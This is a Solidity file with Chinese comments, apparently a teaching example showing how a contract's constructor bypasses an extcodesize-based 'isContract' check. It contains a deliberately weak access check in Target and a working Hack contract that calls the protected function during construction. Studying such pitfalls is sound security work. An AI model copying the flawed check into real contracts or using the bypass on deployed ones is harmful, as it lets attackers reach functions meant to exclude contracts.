// 绕过合约大小检查
// 漏洞
// 如果地址是合约，那么存储在该地址的代码大小将大于 0，对吗？

// 让我们看看如何创建一个 extcodesize 返回的代码大小等于 0 的合约。

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Target {
    function isContract(address account) public view returns (bool) {
        // 这个方法依赖于 extcodesize，它在合约中返回 0
        // 构造，因为代码只存储在末尾
        // 构造函数执行。
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

contract FailedAttack {
    // 尝试调用 Target.protected 将失败，
    // 来自合约的目标块调用
    function pwn(address _target) external {
        // This will fail
        Target(_target).protected();
    }
}

contract Hack {
    bool public isContract;
    address public addr;

    // 创建合约时，代码大小（extcodesize）为0。
    // 这将绕过 isContract() 检查
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        // This will work
        Target(_target).protected();
    }
}
